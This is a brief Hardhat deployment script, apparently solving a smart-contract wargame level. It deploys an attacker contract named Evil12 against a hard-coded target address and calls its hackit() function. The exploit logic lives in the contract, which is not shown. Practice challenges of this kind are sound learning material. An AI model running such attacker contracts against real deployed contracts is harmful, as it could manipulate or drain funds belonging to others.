import { ethers } from "hardhat";
import { Evil12__factory } from "../typechain-types";

async function main() {
  // Reach the top

  let tx; // will have to wait for each tx

  let [deployer] = await ethers.getSigners();
  let contract = "0x03CD44b3480BfDE0a547D484e5f02Fd11436EF64";

  let evil = await new Evil12__factory(deployer).deploy(contract);

  tx = await evil.hackit();
  await tx.wait();
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
